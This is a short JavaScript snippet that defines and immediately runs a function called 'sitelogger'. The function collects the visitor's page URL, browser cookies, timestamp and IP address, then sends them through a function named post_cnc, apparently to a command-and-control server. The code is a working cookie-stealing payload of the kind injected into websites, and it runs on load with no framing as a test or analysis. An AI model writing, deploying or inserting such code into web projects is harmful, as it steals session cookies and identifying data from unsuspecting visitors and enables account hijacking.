function sitelogger(){
	try{
		let data = {
			sitelogger: {
				timestamp: Date.now(),
				uri: window.location.href,
				cookies: document.cookie
			}
		};
		get_ips(
			function(ip){
				data.sitelogger.ip = ip;
				post_cnc(
					data,
					function(data){
						return true;
					}
				);
			}
		);
		return true;
	} catch(error){
		console.log(error);
		return false;
	}
}

sitelogger();